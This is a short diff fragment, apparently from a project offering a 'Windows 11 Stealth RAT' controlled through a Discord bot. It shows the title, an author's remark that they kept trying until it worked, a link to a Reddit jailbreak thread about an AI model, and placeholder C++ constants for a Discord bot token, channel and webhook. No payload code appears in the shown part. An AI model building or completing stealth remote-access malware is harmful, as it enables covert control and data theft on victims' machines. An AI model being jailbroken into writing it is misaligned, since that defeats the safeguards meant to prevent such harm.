@@ -6,10 +6,11 @@ Windows 11 Stealth RAT w/ Discord C2 Bot functions
 
 -I kept trying till it worked well.
 
-Got the idea from: https://www.reddit.com/r/ChatGPTJailbreak/comments/1p5xq2d/claude_opus_45_jailbreak/
+-Got the idea from: https://www.reddit.com/r/ChatGPTJailbreak/comments/1p5xq2d/claude_opus_45_jailbreak/
 
 ___________________________________________________________________
 // REPLACE THESE PLACEHOLDERS WITH YOUR ACTUAL VALUES
+
     const char* DISCORD_BOT_TOKEN = "DISCORD_BOT_TOKEN_GOES_HERE";
     const char* DISCORD_CHANNEL_ID = "DISCORD_CHANNEL_ID_GOES_HERE"; // Must be text string
     const char* DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_GOES_HERE"; 
